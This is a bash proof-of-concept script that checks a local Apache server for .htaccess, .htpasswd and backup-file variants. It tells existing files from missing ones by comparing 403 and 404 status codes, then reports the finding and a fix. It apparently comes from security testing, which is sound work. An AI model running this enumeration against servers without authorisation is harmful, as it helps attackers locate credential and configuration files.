#!/bin/bash

# POC: Apache Configuration File Presence Disclosure via HTTP 403 Responses
# This script demonstrates how HTTP status code differences can be used to enumerate files

TARGET="http://localhost:8080"
echo "=========================================="
echo "Apache Configuration File Enumeration POC"
echo "Target: $TARGET"
echo "=========================================="
echo ""

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo "[*] Testing file enumeration via HTTP status code analysis"
echo ""

# Files to test that should exist (based on evidence)
CONFIG_FILES=(
    ".htaccess"
    ".htpasswd"
    ".htaccess.bak"
    ".htaccess.old"
    ".htaccess~"
    ".htaccess.backup"
    ".htpasswd.bak"
)

# Files that should NOT exist (for comparison)
NONEXISTENT_FILES=(
    ".nonexistent"
    ".fake_config"
    ".test_file_not_here"
)

echo "=== Phase 1: Testing Configuration Files (Expected: 403 Forbidden) ==="
echo ""

FOUND_COUNT=0
for file in "${CONFIG_FILES[@]}"; do
    URL="${TARGET}/${file}"
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$URL")
    
    if [ "$STATUS" == "403" ]; then
        echo -e "${RED}[VULNERABLE]${NC} ${file} - HTTP ${STATUS} (FILE EXISTS - Access Denied)"
        FOUND_COUNT=$((FOUND_COUNT + 1))
    elif [ "$STATUS" == "404" ]; then
        echo -e "${GREEN}[NOT FOUND]${NC} ${file} - HTTP ${STATUS} (File does not exist)"
    else
        echo -e "${YELLOW}[UNKNOWN]${NC} ${file} - HTTP ${STATUS}"
    fi
done

echo ""
echo "=== Phase 2: Testing Non-Existent Files (Expected: 404 Not Found) ==="
echo ""

NOT_FOUND_COUNT=0
for file in "${NONEXISTENT_FILES[@]}"; do
    URL="${TARGET}/${file}"
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$URL")
    
    if [ "$STATUS" == "404" ]; then
        echo -e "${GREEN}[NORMAL]${NC} ${file} - HTTP ${STATUS} (File does not exist)"
        NOT_FOUND_COUNT=$((NOT_FOUND_COUNT + 1))
    else
        echo -e "${YELLOW}[UNEXPECTED]${NC} ${file} - HTTP ${STATUS}"
    fi
done

echo ""
echo "=== Vulnerability Analysis ==="
echo ""

if [ "$FOUND_COUNT" -gt 0 ]; then
    echo -e "${RED}[!] VULNERABILITY CONFIRMED${NC}"
    echo "Files returning 403 Forbidden: $FOUND_COUNT"
    echo "Files returning 404 Not Found: $NOT_FOUND_COUNT"
    echo ""
    echo "Impact: The server distinguishes between 'file exists but forbidden' (403)"
    echo "and 'file does not exist' (404), allowing attackers to enumerate files."
    echo ""
    echo "Confirmed existing files:"
    for file in "${CONFIG_FILES[@]}"; do
        STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/${file}")
        if [ "$STATUS" == "403" ]; then
            echo "  - ${file} (HTTP 403)"
        fi
    done
    echo ""
    echo "Recommendation: Configure server to return 404 for all non-accessible files"
    echo "to prevent file enumeration attacks."
    exit 0
else
    echo -e "${GREEN}[✓] No vulnerability detected${NC}"
    echo "Server properly returns 404 for all tested files."
    exit 1
fi